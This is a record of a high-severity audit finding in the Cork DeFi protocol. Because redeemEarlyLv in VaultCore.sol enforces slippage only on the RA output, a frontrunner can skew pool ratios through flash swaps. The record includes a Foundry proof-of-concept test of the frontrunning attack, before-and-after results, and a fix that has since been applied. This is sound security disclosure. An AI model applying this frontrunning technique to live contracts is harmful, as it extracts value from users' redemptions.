---
tags:
  - lang/solidity
  - sector/dex
  - sector/lending
  - sector/stable
  - sector/token
  - platform/cantina
  - has/poc
  - severity/high
  - impact/mev/frontrun
protocol: "[[Cork]]"
auditors:
  - "[[Sujith Somraaj]]"
report: "https://cdn.cantina.xyz/reports/cantina_competition_cork_december2024.pdf"
genome:
  - "[[spot-price]]"
  - "[[frontrun]]"
  - "[[fot-slippage]]"
  - "[[frontrun-exposure]]"
  - "[[timestamp-dependence]]"
---
# Insuﬃcient slippage protection in redeemEarlyLv leads to MEV through ﬂash swaps 

- id: 53126
- impact: HIGH
- protocol: [[Cork]]
- reporter: Sujith Somraaj (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_competition_cork_december2024.pdf

## Summary


This bug report discusses a vulnerability in the redeemEarlyLv function of the VaultCore.sol contract. This function does not have slippage protection for assets other than the Redemption Asset (RA) received during redemption. This allows malicious actors to manipulate the AMM pool through flash swaps and extract value from users who redeem their LV tokens early. The report includes a Proof of Concept (PoC) that demonstrates how this vulnerability can be exploited. 

The report recommends implementing comprehensive slippage protection by adding minimum output parameters for all assets and adding validation checks in the redeemEarly function. The issue has been fixed in PR 280.

## Details

## Vulnerability Report: Slippage Protection in VaultCore.sol

## Context
- **Files**: FlashSwapRouter.sol#L350, Vault.sol#L85

## Description
The `redeemEarlyLv` function in `VaultCore.sol` implements slippage protection only for the RA (Redemption Asset) amount received but lacks protection for other assets (CT, DS) during redemption. This allows malicious actors to manipulate the AMM pool through flash swaps to extract value from users who redeem their LV tokens early. 

The `redeemEarlyLv` function accepts a minimum output amount parameter (`amountOutMin`), which is only checked against the RA received from AMM:

```solidity
if (result.raReceivedFromAmm < redeemParams.amountOutMin) {
    revert IVault.InsufficientOutputAmount(redeemParams.amountOutMin, result.raReceivedFromAmm);
}
```

However, **no slippage protection exists for**:
- CT (Collateral Token) received from AMM.
- DS (Depeg Swap) tokens received.
- CT received from vault.
- PA (Pegged Asset) received.

## Proof of Concept
The following PoC demonstrates how this vulnerability can be exploited:

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.24;

import "./AuditTestHelper.sol";
import "forge-std/console.sol";
import {IVault} from "contracts/interfaces/IVault.sol";
import {IDsFlashSwapCore} from "contracts/interfaces/IDsFlashSwapRouter.sol";
import "forge-std/console.sol";

contract FlashSwapRouter is TestHelper {
    address frontrunner = address(69_420);

    function setUp() public override {
        super.setUp();
    }

    function test_e2e() public {
        deal(address(ra), user, type(uint256).max);
        deal(address(ra), frontrunner, type(uint256).max);
        deal(address(pa), user, 200e18);
        console.log("---- WITHOUT FRONT_RUNNING");
        _internal(false);
        // console.log("---- WITH FRONT_RUNNING");
        // _internal(true);
    }

    function _internal(bool withFrontrunning) internal {
        (address ct, address ds) = moduleCore.swapAsset(
            defaultCurrencyId,
            moduleCore.lastDsId(defaultCurrencyId)
        );

        vm.startPrank(user);
        ERC20(ra).transfer(address(manager), 1e18);
        ra.approve(address(moduleCore), 200e18);
        moduleCore.depositPsm(defaultCurrencyId, 100e18);
        ra.approve(address(moduleCore), 200e18);
        moduleCore.depositLv(defaultCurrencyId, 1e18, 0, 0);
        
        vm.startPrank(frontrunner);
        ra.approve(address(moduleCore), 200e18);
        moduleCore.depositLv(defaultCurrencyId, 200e18, 0, 0);
        
        IVault.RedeemEarlyParams memory redeemParams = IVault.RedeemEarlyParams(
            defaultCurrencyId,
            1e18,
            502880481053277883,
            block.timestamp + 10 seconds
        );

        ERC20 lv = ERC20(moduleCore.lvAsset(defaultCurrencyId));
        
        if (withFrontrunning) {
            vm.startPrank(frontrunner);
            ra.approve(address(router), 200e18);
            // lv.approve(address(moduleCore), lv.balanceOf(frontrunner));
            // redeemParams.amount = lv.balanceOf(frontrunner);
            // moduleCore.redeemEarlyLv(redeemParams);
            
            IDsFlashSwapCore.BuyAprroxParams memory buyParams;
            buyParams.maxApproxIter = 256;
            buyParams.epsilon = 1e9;
            buyParams.feeIntervalAdjustment = 1e16;
            buyParams.precisionBufferPercentage = 1e16;
            
            router.swapRaforDs(defaultCurrencyId, 1, 1e18, 0, buyParams);
        }

        vm.startPrank(user);
        lv.approve(address(moduleCore), lv.balanceOf(user));
        redeemParams.amount = lv.balanceOf(user);
        IVault.RedeemEarlyResult memory result = moduleCore.redeemEarlyLv(
            redeemParams
        );

        console.log("received");
        console.log("result.raReceivedFromAmm:", result.raReceivedFromAmm);
        console.log("result.raIdleReceived:", result.raIdleReceived);
        console.log("result.paReceived:", result.paReceived);
        console.log("result.ctReceivedFromAmm:", result.ctReceivedFromAmm);
        console.log("result.ctReceivedFromVault:", result.ctReceivedFromVault);
        console.log("result.dsReceived:", result.dsReceived);
    }
}
```

### Results

#### Without Frontrunning
- `result.raReceivedFromAmm`: 549427188799996954
- `result.ctReceivedFromAmm`: 549976615988796950
- `result.dsReceived`: 549976615988797005

#### With Frontrunning (Attacker manipulating the RA / CT AMM pool)
- `result.raReceivedFromAmm`: 502880481053277883
- `result.ctReceivedFromAmm`: 600882549325828178
- `result.dsReceived`: 549976615988797005

This shows that while the RA amount meets the minimum threshold, an attacker can manipulate the pool to unfavorably alter the CT/DS ratio for the user, effectively extracting value from the redemption.

## Recommendation
1. **Implement comprehensive slippage protection** by adding minimum output parameters for all assets:

```solidity
struct RedeemEarlyParams {
    Id id;
    uint256 amount;
    uint256 raAmountOutMin;
    uint256 ctAmountOutMin; // Add minimum CT output
    uint256 dsAmountOutMin; // Add minimum DS output
    uint256 paAmountOutMin; // Add minimum PA output
    uint256 ammDeadline;
}
```

2. **Add validation checks in the `redeemEarly` function**:

```solidity
function redeemEarly(/*...*/) {
    // Existing checks
    if (result.raReceivedFromAmm < redeemParams.raAmountOutMin) {
        revert InsufficientOutputAmount("RA", redeemParams.raAmountOutMin, result.raReceivedFromAmm);
    }
    // Add new checks
    if (result.ctReceivedFromAmm + result.ctReceivedFromVault < redeemParams.ctAmountOutMin) {
        revert InsufficientOutputAmount("CT", redeemParams.ctAmountOutMin, result.ctReceivedFromAmm + result.ctReceivedFromVault);
    }
    if (result.dsReceived < redeemParams.dsAmountOutMin) {
        revert InsufficientOutputAmount("DS", redeemParams.dsAmountOutMin, result.dsReceived);
    }
    if (result.paReceived < redeemParams.paAmountOutMin) {
        revert InsufficientOutputAmount("PA", redeemParams.paAmountOutMin, result.paReceived);
    }
}
```

Alternatively, the issue can be blocked at the CorkHook level by blocking swaps during an ongoing exit of LP, through the beforeSwap hook.

**Cork**: Fixed in PR 280.
